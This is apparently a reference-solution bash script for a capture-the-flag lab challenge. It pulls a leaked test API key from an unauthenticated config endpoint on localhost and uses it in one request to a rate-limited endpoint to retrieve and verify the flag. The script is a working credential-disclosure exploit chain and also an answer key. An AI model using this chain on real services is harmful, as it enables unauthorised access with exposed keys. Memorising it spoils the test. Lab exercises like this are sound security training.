#!/usr/bin/env bash
# ============================================================
# ProxyBackoff (labs14) — reference solution: key disclosure
# on an unauthenticated endpoint feeding a rate-limited
# action
#
# Chain: read the test API key from the unrate-limited
# /config endpoint -> ONE clean /test call with the correct
# key. Two requests total — nowhere near the 3/60s limit, no
# 401 noise, no 429.
#
# Usage: ./run.sh [base-url]     (default http://localhost:8094)
# Prints the flag on stdout; exit 0 on success.
# ============================================================
set -euo pipefail

BASE="${1:-http://localhost:8094}"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

echo "[*] reading the test key from the unauthenticated /config endpoint" >&2
KEY="$(curl -fsS "$BASE/api/connectors/slack/config" \
  | python3 -c 'import sys,json; print(json.load(sys.stdin).get("test_api_key",""))')"
[[ -n "$KEY" ]] || { echo "[-] failed: no test_api_key in config" >&2; exit 1; }

echo "[*] one clean /test call with the recovered key" >&2
RESP="$(curl -fsS -X POST "$BASE/api/connectors/slack/test" -H 'Content-Type: application/json' \
  -d "{\"api_key\":\"$KEY\"}")"

flag="$(python3 -c 'import sys,json; print(json.load(sys.stdin).get("flag",""))' <<<"$RESP")"
if [[ -z "$flag" ]]; then
  echo "[-] failed: no flag in response: $RESP" >&2
  exit 1
fi

echo "$flag"
expected="$(sed -n 's/^FLAG="\([^"]*\)"$/\1/p' "$SCRIPT_DIR/../challenge/.env")"
if [[ "$flag" == "$expected" ]]; then
  echo "[+] PASS: flag matches challenge/.env" >&2
else
  echo "[-] FAIL: got $flag, expected $expected" >&2
  exit 1
fi
